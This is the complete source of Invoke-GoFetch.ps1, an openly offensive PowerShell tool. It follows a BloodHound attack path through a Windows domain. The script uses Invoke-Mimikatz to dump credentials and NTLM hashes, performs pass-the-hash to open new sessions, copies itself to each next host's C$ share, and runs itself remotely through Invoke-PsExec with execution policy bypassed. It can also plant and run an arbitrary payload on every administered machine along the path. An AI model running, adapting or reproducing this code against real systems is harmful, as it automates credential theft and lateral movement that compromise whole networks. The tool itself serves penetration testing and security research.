<#
	.SYNOPSIS

		File: Invoke-GoFetch.ps1
		Version: 1.0
		Author: Tal Maor, Twitter: @TalThemaor
		Co-Author: Itai Grady, Twitter: @ItaiGrady
		License:  MIT License

		Depends on BloodHound Graphs realse 1.2.1 - https://github.com/BloodHoundAD/BloodHound/releases
		Required Dependencies: Invoke-Mimikatz https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1
		Required Dependencies: Mimikatz 2.0 alpha https://github.com/gentilkiwi/mimikatz
		Required Dependencies: Invoke-PsExec https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-PsExec.ps1
		Optional Dependencies: None

	.DESCRIPTION
		
		This script leverages Invoke-Mimikatz reflectively load Mimikatz, dump credentails, choose the relevant one according to the BloodHound graph. 
		This allows you to move from target computer to another according to a BloodHound path provided as input to Invoke-GoFetch.

	.PARAMETER PathToGraph 
		
		Path to the BloodHound exported Graph which includes a path between two users.

	.PARAMETER PathToPayload
		
		Path to local payload file .exe/.bat/.ps1 to run on next nodes in the path.

	.EXAMPLE
		
		.\Invoke-GoFetch.ps1 -PathToGraph .\graph.json

	.EXAMPLE
	
		.\Invoke-GoFetch.ps1 -PathToGraph .\graphExample.json -PathToPayload .\payload.exe

	.NOTES
	
		This script should be able to run from any version of Windows through Windows 7 that has PowerShell v2 or higher installed and .Net 3.5 or higher.

		Mimikatz version: The Mimikatz DLL within Invoke-Mimikatz in this repo was changed and compiled again to support powershell arguments https://github.com/GoFetchAD/mimikatz
#>

Param(
		[Parameter(Position=0, Mandatory=$false)]
		[string]
        [alias("pathToBloodHoundGraph")]
		$PathToGraph,
		[Parameter(Position=0, Mandatory=$false)]
		[string]
        [alias("PathToAdditionalPayload")]
		$PathToPayload
    )

Function WriteLog($stringToWrite)
{
	try
    {
	    if ($writeToLog -eq $true)
	    {
		    Add-Content $pathToLog ('{0} {1}' -f (Get-Date -format g),$stringToWrite)
	    }
    }
    catch
    {
        $errorMessage = $_.Exception.Message
        $failedItem = $_.Exception.ItemName
        Write-Host ("Error - Couldnt write to log file, {0}" -f $errorMessage)
    }
}

Function ConvertTo-Json20([object] $item)
{
    add-type -assembly system.web.extensions
    $ps_js=new-object system.web.script.serialization.javascriptSerializer
    return $ps_js.Serialize($item)
}

Function ConvertFrom-Json20([object] $item)
{ 
    add-type -assembly system.web.extensions
    $ps_js=new-object system.web.script.serialization.javascriptSerializer

    #The comma operator is the array construction operator in PowerShell
    return ,$ps_js.DeserializeObject($item)
}

Function BloodHoundGraphToGoFetchPath
{
	<#
	.SYNOPSIS
		
		Creates GoFetch attack path out of BloodHound path between two users.
		
		Function: BloodHoundGraphToGoFetchPath
		Version: 1.0
		Author: Tal Maor, Twitter: @TalThemaor
		Co-Author: Itai Grady, Twitter: @ItaiGrady
		License:  MIT License

	.PARAMETER pathToBloodHoundGraph 
		
		Path to the BloodHound exported Graph which includes a path between two users.

	 .PARAMETER 
			
		pathToOutputGoFetchPath - Path to output path graph in the GoFetch folder.

	 .PARAMETER (optional) pathToAdditionalPayload 
		
		Path to local payload file .exe/.bat/.ps1 to run on next nodes in the path.

	 .PARAMETER pathToGoFetchFolder
	
		Path to GoFetch folder.

	 .EXAMPLE
 
		BloodHoundGraphToGoFetchPath -pathToBloodHoundGraph $pathToGraph -pathToOutputGoFetchPath $pathToAttackFile -pathToAdditionalPayload $PathToPayload -pathToGoFetchFolder $rootFolder

	#>
    Param(
		        [Parameter(Position=0, Mandatory=$true)]
		        [alias("pathToBloodHoundGraph")]
                [string]
		        $pathToGraph,
                [Parameter(Position=1, Mandatory=$true)]
    		    [alias("pathToOutputGoFetchPath")]    
                [string]
		        $pathToOutputFileWithGoFetchPath,
				[Parameter(Position=2, Mandatory=$false)]
    		    [alias("pathToAdditionalPayload")]    
                [string]
		        $pathToPayload,
				[Parameter(Position=3, Mandatory=$false)]
    		    [alias("pathToGoFetchFolder")]    
                [string]
		        $pathToRootFolder

		    )
    $global:startNode = $null
    $global:endNode = $null
	$sourceNodesDict = @{}

    Function Init
    {
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[System.Collections.Generic.Dictionary[System.String,System.Object]]
		$originalGraph
        ) 

        try
        {
            ForEach ($edge in $originalGraph.edges)
            {
				$sourceNodesDict.add($edge.source, $edge)
            }

			InitFirstAndLastNodes $originalGraph
        }
        catch
        {
            $errorMessage = $_.Exception.Message
            $failedItem = $_.Exception.ItemName
            throw ("Couldnt init the variable of GoFetch path - {0}" -f $errorMessage)
        }
    }

    Function InitFirstAndLastNodes($originalGraph)
    {
		
        $degreeOneNodesArray = @()

        # find only source node and target node which has degree 1 (only one edge connected)
        ForEach ($node in $originalGraph.nodes)
        {
            if($node.degree -eq 1)
            {
                $degreeOneNodesArray += @($node.id)
            }
        }

        if ($degreeOneNodesArray.Length -eq 2)
        {

            if ($sourceNodesDict.Contains($degreeOneNodesArray[0]))
            {
                $global:startNode = $degreeOneNodesArray[0]
                $global:endNode = $degreeOneNodesArray[1]
            }
            else
            {
                $global:startNode = $degreeOneNodesArray[1]
                $global:endNode = $degreeOneNodesArray[0]
            }
        }
        else
        {
            throw "Input is not a valid path"
        }
    }

    Function IDToUser
    {
        Param(
		        [Parameter(Position=0, Mandatory=$true)]
		        [string]
		        $id,
				[Parameter(Position=1, Mandatory=$true)]
		        [System.Collections.Generic.Dictionary[System.String,System.Object]]
		        $originalGraph
              ) 
    
       if ($originalGraph.spotlight.ContainsKey($id))
       {
            return $originalGraph.spotlight[$id][0]
       }
            
        return $null
    }

    Function CreateGoFetchPath
    {
		$pathOfAttack = @()
    
		try
        {
			if (Test-Path $pathToGraph)
            {
                $originalGraph = ConvertFrom-Json20(Get-Content -Path $pathToGraph -ErrorAction Stop)
            }
            else
            {
                throw "Path {0} is not exsits or not a file" -f $originalGraph
            }

			Init $originalGraph
            $runner = $global:startNode
			
			if (-not [string]::IsNullOrEmpty($pathToPayload) -and (Test-Path $pathToPayload))
			{
				$payloadName = Split-Path $pathToPayload -Leaf
				if ((Test-Path ($pathToRootFolder + '\'+ $payloadName)) -eq $false)
				{
					Copy-Item -Path $pathToPayload -Destination $pathToRootFolder -Force
					$message = "Copied {0} to {1}" -f ($payloadName, $pathToRootFolder)
				}
				else
				{
					$message = "The file {0} is already exsit in {1} did not override it" -f ($payloadName, $pathToRootFolder)
				}

				Write-Host $message
				WriteLog $message
			}
			

            #Write-Host "Attack Plan:"
            While ($runner -ne $global:endNode) 
            {
                $step = @{}
                ForEach ($k in ("source", "target", "label","id")) { $step.Add($k, $sourceNodesDict[$runner][$k]) }
            
                $step.Add("sourceName", (IDToUser $step.source $originalGraph))
                $step.Remove("source")
				$step.Add("targetName", (IDToUser $step.target $originalGraph))
                $step.Remove("target")

				if ($step.label -eq "AdminTo" -and $payloadName -ne $null)
                {
					
                    $step.Add("payloadFileName", $payloadName)
                }
                $pathOfAttack += @($step)
                $runner = $sourceNodesDict[$runner].target
            }

			
			# In case the BloodHound path does not incldue the first machine which has session of the first user, 
			# GoFetch adds a dummy node to dump the credentails of the first user.
			if ($pathOfAttack.Count -gt 0)
			{
				$firstUserAdminToNextNode_ConnetedToAttackerMachine = ($pathOfAttack[0]["sourceName"]).ToLower()
				$currentUser = ($env:UserName + '@' + (Get-WmiObject win32_computersystem).Domain).ToLower()
				if ($pathOfAttack[0].label -ne "HasSession" -and $firstUserAdminToNextNode_ConnetedToAttackerMachine -ne $currentUser)
				{
					WriteLog " Warnning - Assuming the first user has session on the first machine"
					# the first user used to attack - need to get its NTLM from the attacker computer 
					$attackerMachineFQDN=(Get-WmiObject win32_computersystem).DNSHostName+"."+(Get-WmiObject win32_computersystem).Domain
					$step = @{'sourceName' = $attackerMachineFQDN; 'label'= 'HasSession'; 'targetName' =$firstUserAdminToNextNode_ConnetedToAttackerMachine}
					$pathOfAttack = @($step) + $pathOfAttack
				}
			}

            $outputFormat = @{"path" = "";"final" = @(); "exceptions" = @();"status" = @{};"startNode" = @{}}
			$outputFormat.path = $pathOfAttack
            $outputFormat.startNode.Add("name",(hostname))
            Set-Content $pathToOutputFileWithGoFetchPath (ConvertTo-Json20 $outputFormat -Depth 99) -Force
			Write-Host ("GoFetch path was created in {0}" -f $pathToOutputFileWithGoFetchPath)
        }
        catch
        {
            $errorMessage = $_.Exception.Message
            $failedItem = $_.Exception.ItemName
            $logMessage = "Couldn't create GoFetch path - {0}" -f $errorMessage
			write-host $logMessage 
			WriteLog $logMessage 
        }
    }

    CreateGoFetchPath
}

#Local file names
$rootFolder = Split-Path $MyInvocation.MyCommand.Path -Parent
$pathToGoFetchScript = $rootFolder + "\Invoke-GoFetch.ps1"
$pathToInvokeMimikatz = $rootFolder + "\Invoke-Mimikatz.ps1"
$pathToInvokePsExec = $rootFolder + "\Invoke-PsExec.ps1"
$pathToLog = $rootFolder + "\GoFetchLog.log"
$pathToPsExecLog = $rootFolder + "\PsExecLog.log"
$pathToFileWithReturnedResult = $rootFolder + "\GoFetchOutput.json"
$pathToAttackFile = $rootFolder + "\GoFetchPath.json"
#Remote file names    
$rootFolderOnRemote = "C:\GoFetch"
$remoteFolderPathToGoFetch = "\\{0}\c$\GoFetch"
$remotePathToGoFetch = $rootFolderOnRemote + "\Invoke-GoFetch.ps1"
$remotePathToLogFile = $remoteFolderPathToGoFetch + "\GoFetchLog.log"
$remotePathToGoFetchScript = $remoteFolderPathToGoFetch + "\Invoke-GoFetch.ps1"
$remotePathToInvokeMimikatz = $remoteFolderPathToGoFetch + "\Invoke-Mimikatz.ps1"
$remotePathToInvokePsExec = $remoteFolderPathToGoFetch + "\Invoke-PsExec.ps1"
$remotePathToAttackFile = $remoteFolderPathToGoFetch + "\GoFetchPath.json"
$remotePathToOutputFile = $remoteFolderPathToGoFetch + "\GoFetchOutput.json"
#Global variables
$global:writeToLog = $true

<#
Import-Module Invoke-Mimikatz
Published: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1

Function: Invoke-Mimikatz
Author: Joe Bialek, Twitter: @JosephBialek
Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
Mimikatz License:  http://creativecommons.org/licenses/by/3.0/fr/
Required Dependencies: Mimikatz (included)
Optional Dependencies: None
Mimikatz version: 2.0 alpha (12/14/2015)

Copyright (c) 2012, Matthew Graeber
All rights reserved.

Modifications: The Mimikatz DLL was changed and compiled again - please use the one provided with Invoke-GoFetch

#>
Import-Module -Name $pathToInvokeMimikatz -Force

<#

Import-Module Invoke-PsExec
Published: https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-PsExec.ps1

Function: Invoke-PsExec
Author: @harmj0y
License: BSD 3-Clause

Copyright (c) 2015, Will Schroeder and Justin Warner
All rights reserved.

Modifications: None

#>
Import-Module -Name $pathToInvokePsExec -Force

Function Invoke-GoFetch
{
	<#
	
	.SYNOPSIS

		Function: Invoke-GoFetch
		Author: Tal Maor, Twitter: @TalThemaor
		Co-Author: Itai Grady, Twitter: @ItaiGrady
		License:  MIT License

	.DESCRIPTION
		
		This function is a recursion which expects to get GoFetch path between two users from a predefined file name and location.
		This version supports the following BloodHound labels: MemberOf, HasSession and AdminTo.
		In each iteration, GoFetch reads the first step in the path and preforms the required operations according to the step label.
		
		MemberOf - takes details from this step, move them to the next step and save the path.
		HasSession - takes the username details, dumps credentials from memory, update the next step with the relevant NTLM and starts a new session with the stolen creds.
		AdminTo - copy GoFetch and its dependencies to the next machine according to the path, execute GoFetch remotely and waits for the remote process to create output file as a completion sign.


	.EXAMPLE
	
		.\Invoke-GoFetch.ps1

	.NOTES

		This function expect to find: Invoke-Mimikatz, Invoke-Psexec and GoFetchPath.json files in the same folder it's located.
	#>

    # Inspired by http://pwndizzle.blogspot.com/2015/10/parse-mimikatz-output-one-liner.html
    Function Parse-Mimikatz
    {
        Param(
		        [Parameter(Position=0, Mandatory=$true)]
		        [string]
		        $mimikatzOutputData
		        )

        $regexPattern = '(User Name         : (?<name>(\S)*)|Primary(\s+)\* Username : (?<name>(\S)*)|NTLM     : (?<ntlm>(\S)*))'
        $matchs = Select-String -input $mimikatzOutputData -Pattern $regexPattern -AllMatches
        $dictUserAndNTLM = @{}
        $index = 0

        for($i=0; $i -lt $matchs.Matches.length -1; $i = $i + 1)
        {
            if ($matchs.Matches[$i].Groups.Item("name"))
            {
                $userName = $matchs.Matches[$i].Groups["name"].value.ToLower()
            }
        
            if ($matchs.Matches[$i+1].Groups.Item("ntlm"))
            {
                $NTLM = $matchs.Matches[$i+1].Groups["ntlm"].value
            }

            if ($userName -and $NTLM -and -not $dictUserAndNTLM.ContainsKey($userName))
            {
                $dictUserAndNTLM.Add($userName,$NTLM)
                $userName = $null
                $NTLM = $null
            }
        }
        return $dictUserAndNTLM
    }
    
    Function CopyAndRunAdditionalPayload($targetComputer, $additionalPayloadFileName)
    {
        try
        {
			$remotePathToPayload = ($remoteFolderPathToGoFetch -f $targetComputer) + "\" + $additionalPayloadFileName
            $pathToLocalPayload = $rootFolderOnRemote + "\" + $additionalPayloadFileName
			$pathToAdditonalPayload = $rootFolder + "\" + $additionalPayloadFileName
			
			if (Test-Path $pathToAdditonalPayload)
            {
				WriteLog ('Copy payload from {0} to {1}' -f ($pathToAdditonalPayload, $remotePathToPayload ))
                Copy-Item -Path $pathToAdditonalPayload -Destination $remotePathToPayload -Force
				WriteLog ('Copied additional payload from {0} to {1}' -f ($pathToAdditonalPayload, $remotePathToPayload ))
                
				# todo: change populate $runAdditionalPayloadOnNextNode from input path
				$runAdditionalPayloadOnNextNode = $true
				if ($runAdditionalPayloadOnNextNode)
                {
                    # Invoke the additional payload
					$command = ("cmd.exe /c {0}" -f $pathToLocalPayload)
					WriteLog ("Run Invoke-PsExec with command: {0}" -f $command)
                    $PSEXECoutput = & Invoke-PsExec -ComputerName $targetComputer -Command $command -ResultFile $pathToPsExecLog
					WriteLog ("Invoke-PsExec additional payload command: {0}" -f $command)
					ForEach ($logLine in $PSEXECoutput) { WriteLog "PsExec: {0}" -f $logLine}
                    Start-Sleep 3
					WriteLog ('CopyAndRunAdditionalPayload - Done on {0}' -f $targetComputer)
                }
            }
        }
        catch
        {
            AddDetailsOfException $_.Exception.Message "Failed to run addtional payload, line " $_.InvocationInfo.ScriptLineNumber
        }
    }

    Function WriteResultsToFinalFile($resultToReturn)
    {
        $statusDetails = @{}
        $statusDetails.Add("Type","Done")
        
        try
        {
            $statusDetails.Add("Message","GoFetch finished")
            if ([bool]($resultToReturn.PSobject.Properties.name -match "status"))
            {
                $resultToReturn.status = $statusDetails
            }

            if ($pathOfAttack -eq $null)
            {
                throw "Path Of attack is empty - " + $_.Exception.Message
            }

            $resultToReturn = (ConvertTo-Json20 $pathOfAttack -Depth 99)
            set-content $pathToFileWithReturnedResult $resultToReturn
        }
        catch
        {
			$resultToReturn = '{"path" : [] ,"final" = [], "exceptions" : {0},"status": {"Type" : "Exception"}}' -f ($_.Exception.Message)
            set-content $pathToFileWithReturnedResult $resultToReturn 
        }
        
		WriteLog 'Local GoFetchOutput.log file was created'
    }

    Function PromptFinalMessage($GoFetchOutput, $isException)
    {
		try
		{
			if ($isException -eq $true)
			{
				$messageToPrompt = $pathOfAttack.exceptions
			}
			else
			{
				$finalOutput = $GoFetchOutput.final
				$lastTarget = $finalOutput[$finalOutput.Length -1].TargetName
				$lastTargetNTLM = $finalOutput[$finalOutput.Length -1].TargetNTLMhash
				$exceptions = $GoFetchOutput.exceptions
				$numberOfExceptions = $exceptions.Length

				if ($lastTarget -and $lastTargetNTLM)
				{
					$messageToPrompt = ("The last target is {0} NTLM hash {1} `nFor the whole output look at {2} `nNumber of exceptions {3}" -f  $lastTarget, $lastTargetNTLM, $pathToFileWithReturnedResult, $numberOfExceptions)
				}
				elseif ($lastTarget)
				{
                
					$messageToPrompt = ("The last target is {0} could not get the NTLM hash `nFor the whole output look at {1} `nNumber of exceptions {2}" -f  $lastTarget, $pathToFileWithReturnedResult,$numberOfExceptions)
				}
				else
				{
					$messageToPrompt = ("Something went wrong `nNumber of exceptions {0}" -f $numberOfExceptions)
				}
			}
			#msg * $messageToPrompt
			WriteLog ('Prompt message: {0}' -f $messageToPrompt)
			[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
			[Windows.Forms.MessageBox]::Show($messageToPrompt.ToString(), "Invoke-GoFetch", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information)
		}
		catch
		{
			WriteLog('Error in final message')
		}
    }

    Function CopyAndExecuteNext($targetComputer, $targetUser, $additionalPayloadFileName)
    {
        try
        {
            # Copy files to target
            New-Item -ItemType Directory -Force -Path ($remoteFolderPathToGoFetch -f $targetComputer)
            Copy-Item -Path $pathToGoFetchScript -Destination ($remotePathToGoFetchScript -f $targetComputer) -Force
			Copy-Item -Path $pathToInvokeMimikatz -Destination ($remotePathToInvokeMimikatz -f $targetComputer) -Force
			Copy-Item -Path $pathToInvokePsExec -Destination ($remotePathToInvokePsExec -f $targetComputer) -Force
            Copy-Item -Path $pathToAttackFile -Destination ($remotePathToAttackFile -f $targetComputer) -Force
            
            # make sure output is not exist
            $pathToOutputOnNextNode = ($remotePathToOutputFile -f $targetComputer)
            if (Test-Path $pathToOutputOnNextNode) { Remove-Item $pathToOutputOnNextNode} 

            # Copy and run payload
			CopyAndRunAdditionalPayload $targetComputer $additionalPayloadFileName

            # Run GoFetch on next node
			Invoke-PsExec -ComputerName $targetComputer -Command ('cmd.exe /c "echo . | powershell -ExecutionPolicy bypass {0}"' -f $remotePathToGoFetch)
			WriteLog ('CopyAndExecuteNext - Done Invoke-PsExec on {0} ' -f $targetComputer)

            # Wait to GoFetchOutput.log of the next node to be created - sign to go home
            $remotePathToCompletionFile = ($remotePathToOutputFile -f $targetComputer)
            WriteLog ('Waiting to GoFetchOutput.log file in {0}' -f $remotePathToCompletionFile)
            
            While (!(Test-Path $remotePathToCompletionFile)) {Start-Sleep 10}
            
        }
        catch
        {
            AddDetailsOfException $_.Exception.Message "Failed in Attacking the next node, line " $_.InvocationInfo.ScriptLineNumber
            WriteResultsToFinalFile $pathOfAttack
        }

        # Do finals and create completion file localy
        $remoteCompletionFile = Get-Content -Path $remotePathToCompletionFile
		$pathOfAttack = (ConvertFrom-Json20 $remoteCompletionFile)

		if (Test-Path ($remotePathToLogFile -f $targetComputer))
		{
			$logOfNextNode = Get-Content -Path ($remotePathToLogFile -f $targetComputer)
			$logOfNextNode | ForEach {WriteLog (" |{0}| - {1}" -f ($targetComputer ,$_))}
		}
       	
        # Remove GoFetch folder created on the next node
        Remove-Item ($remoteFolderPathToGoFetch -f $targetComputer) -Recurse
       
		# Print final message if returned to the first node
        if ((hostname) -eq $pathOfAttack.startNode.name)
        {
            PromptFinalMessage $pathOfAttack $false
        }

		if($pathOfAttack.status.Type -eq "Exception")
		{
			PromptFinalMessage $pathOfAttack $true
		}
        
        WriteResultsToFinalFile $pathOfAttack

        Exit
    }

    Function AddDetailsOfNodesToFinal($targetName,$targetComputer,$domainName,$TargetNTLMhash)
    {
        $nodeDetails = @{}
        $nodeDetails.Add("TargetName",$targetName)
        $nodeDetails.Add("TargetComputer",$targetComputer)
        $nodeDetails.Add("DomainName",$domainName)
        $nodeDetails.Add("TargetNTLMhash",$TargetNTLMhash)
        $nodeDetails.Add("Label","Final")

        $pathOfAttack.final = $pathOfAttack.final += $nodeDetails
        return $pathOfAttack
    }

    Function AddDetailsOfException($originalExceptionMessage, $theScriptMessage)
    {
        $nodeDetails = @{}
        $nodeDetails.Add("Hostname",(hostname))
        $nodeDetails.Add("Exception",$originalExceptionMessage)
        $nodeDetails.Add("Message",$theScriptMessage)
        $nodeDetails.Add("Label","Exception")

        $pathOfAttack.exceptions = $pathOfAttack.exceptions += $nodeDetails
        WriteLog ('Exception was added {0}' -f (ConvertTo-Json20 $nodeDetails -Depth 99))
        return $pathOfAttack
    }

    $pathOfAttack = $null
    $isAdditionalPayloadExist = $false

	<#
		Main Function of GoFetch that iterate on the attack path, copy GoFetch to the next node, execute GoFetch again and waits for results on the next node.
	#>
    Function Main
    {

        try
        {
            WriteLog ('GoFetch started on {0}' -f (hostname))
			Write-Host ('GoFetch started on {0} the log file is in {1}' -f ((hostname),$pathToLog)) 
			
			
			#GoFetch should work on PS3 as long as .Net 3.5 is installed 
			# if system.web.extensions is missing GoFetch can't read/write the input/output then it has to create special output and return home
            try
			{
				add-type -assembly system.web.extensions
			}
			catch
			{
				$exceptionMessage = "GoFetch requires .Net 3.5 or above, Missing on {0}" -f $env:computername
				$resultToReturn = '{"path" : [] ,"final" = [], "exceptions" : {0},"status": {"Type" : "Exception"}}' -f ($exceptionMessage)
				Set-Content $pathToFileWithReturnedResult $resultToReturn
				return
			}
			
            $pathOfAttack = ConvertFrom-Json20 (Get-Content -Path $pathToAttackFile -ErrorAction Stop)
            
            WriteLog 'Attack path loaded - Verifying path'
            if ($pathOfAttack -eq $null -or $pathOfAttack.Length -eq 0 -or $pathOfAttack.path.Length -eq 0)
            {
				$exceptionMessage = "Invalid attack path"
				$resultToReturn = '{"path" : [] ,"final" = [], "exceptions" : {0},"status": {"Type" : "Exception"}}' -f ($exceptionMessage)
				Set-Content $pathToFileWithReturnedResult $resultToReturn
				return
            }

        }
        catch
        {
            $errorMessage = $_.Exception.Message
            Write-Host ("Error: Couldn't load files - Make sure that Invoke-GoFetch.ps1 and {0} are in {1} and that GoFetchPath is in the right format " -f ($pathToAttackFile,$rootFolder))
            Write-Host $_.Exception.Message
			WriteResultsToFinalFile $errorMessage
            return
        }

        if ($pathOfAttack.path[0].label -eq "MemberOf")
        {
            try
            {
                WriteLog 'GoFetch in MemberOf'
                # Get relevant data from this step
                $targetUserWithDomain = $pathOfAttack.path[0].sourceName
                $NTLMTargetUser = $pathOfAttack.path[0].TargetNTLMhash

                # Remove the first node 
                $pathOfAttack.path = $pathOfAttack.path[1..$pathOfAttack.path.Length]
                
                # Update next step with the data
                $pathOfAttack.path[0].sourceName = $targetUserWithDomain 
                $pathOfAttack.path[0].Add("TargetNTLMhash",$NTLMTargetUser)

                # Write the new path after changed to file - optional
                Set-Content -path $pathToAttackFile (ConvertTo-Json20 $pathOfAttack -Depth 99)
            }
            catch
            {
                AddDetailsOfException $_.Exception.Message "Failed in MemberOf case, line " $_.InvocationInfo.ScriptLineNumber
                WriteResultsToFinalFile $pathOfAttack
            }
        }
		
		if ($pathOfAttack.path[0].label -eq "HasSession")
        {
            try
            {
                WriteLog 'GoFetch in HasSession'
                $targetUser,$targetDomain = $pathOfAttack.path[0].targetName.split("@")
                $targetComputer = $pathOfAttack.path[0].sourceName.split(".")[0]
				
				if ([string]::IsNullOrEmpty($targetUser) -or [string]::IsNullOrEmpty($targetDomain))
				{
					$exceptionMessage = "Missing username or domain in HasSession"  					
					WriteLog $exceptionMessage 
					throw $exceptionMessage 
				}

                $mimikatzOutput = Invoke-Mimikatz -DumpCred
                $parsedMimikatz = Parse-Mimikatz $mimikatzOutput
                $NTLMTargetUser = $parsedMimikatz[$targetUser.ToLower()]
				
				if ([string]::IsNullOrEmpty($NTLMTargetUser))
				{
					$exceptionMessage = "Failed to retrieve NTLM hash of user {0}" -f $targetUser
					WriteLog $exceptionMessage 
					throw $exceptionMessage 
				}

				# Add the target's NTLM hash and write it to output file
                $pathOfAttack = AddDetailsOfNodesToFinal $targetUser $targetComputer $targetDomain $NTLMTargetUser

                # Move to the next node
                $pathOfAttack.path = $pathOfAttack.path[1..$pathOfAttack.path.Length]
                
                if ($pathOfAttack.path.Length -eq 0)
                {
                    #  If the path is empty then the current node is the last.
                    if ($pathOfAttack.final.Length -gt 0)
                    {
                        WriteLog " --The END-- "
                        WriteResultsToFinalFile $pathOfAttack
                        # update the path file so the process after PTH will perform psexec.
                        Set-Content -path $pathToAttackFile (ConvertTo-Json20 $pathOfAttack -Depth 99)
                        WriteLog "Exiting from GoFetch"
                        Exit
                    }    
                }
                else
                {
                    $pathOfAttack.path[0].Add("TargetNTLMhash",$NTLMTargetUser)
                }

                 # Update the path file so the process created for the Pass-The-Hash (PTH) will get updated input.
                 Set-Content -path $pathToAttackFile (ConvertTo-Json20 $pathOfAttack -Depth 99)

                # Do PTH
				$command =('"sekurlsa::pth /user:{0} /domain:{1} /ntlm:{2} /run:{3}"' -f $targetUser, $targetDomain, $NTLMTargetUser, $pathToGoFetchScript)
                WriteLog $command
				Write-Host "GoFetch is about to create a new process with the stolen creds, the current process will be closed."
                $mimikatzOutput = Invoke-Mimikatz -Command $command
                WriteLog ("Mimikatz PTH output: {0}" -f $mimikatzOutput)
            }
            catch
            {
                AddDetailsOfException $_.Exception.Message "Failed in HasSession case, line " $_.InvocationInfo.ScriptLineNumber
                WriteResultsToFinalFile $pathOfAttack
            }
        }
		elseif ($pathOfAttack.path[0].label -eq "AdminTo")
        {
            try
            {
                WriteLog "GoFetch in AdminTo"
                $targetUser,$targetDomain = $pathOfAttack.path[0].sourceName.split("@")
                $targetComputer = $pathOfAttack.path[0].targetName.split(".")[0]

				if ([string]::IsNullOrEmpty($targetUser) -or [string]::IsNullOrEmpty($targetDomain) -or [string]::IsNullOrEmpty($targetComputer))
				{
					$exceptionMessage = "Missing username, domain, computername in AdminTo"  					
					WriteLog $exceptionMessage 
					throw $exceptionMessage 
				}

                # Check if payload should be running on the next node
                $runPayloadFileName = $null
				if (-not [string]::IsNullOrEmpty($pathOfAttack.path[0].payloadFileName)) 
				{
					$runPayloadFileName = $pathOfAttack.path[0].payloadFileName
				}

                # Remove the first node
                $pathOfAttack.path = $pathOfAttack.path[1..$pathOfAttack.path.Length]
                Set-Content -path $pathToAttackFile (ConvertTo-Json20 $pathOfAttack -Depth 99)
                
				WriteLog ("CopyAndExecuteNext with targetComputer: {0} and targetUser: {1} and payload: {2}" -f $targetComputer,$targetUser,$runPayloadFileName)
                CopyAndExecuteNext $targetComputer $targetUser $runPayloadFileName
                
            }
            catch
            {
                AddDetailsOfException $_.Exception.Message "Failed in AdminTo case, line " $_.InvocationInfo.ScriptLineNumber
                WriteResultsToFinalFile $pathOfAttack
            }
        }
		else
		{
			AddDetailsOfException "Step label is not valid"
            WriteResultsToFinalFile $pathOfAttack
		}
     }

Main
}


if ($PathToGraph)
{
    BloodHoundGraphToGoFetchPath -pathToBloodHoundGraph $pathToGraph -pathToOutputGoFetchPath $pathToAttackFile  -pathToAdditionalPayload $PathToPayload -pathToGoFetchFolder $rootFolder
}

Invoke-GoFetch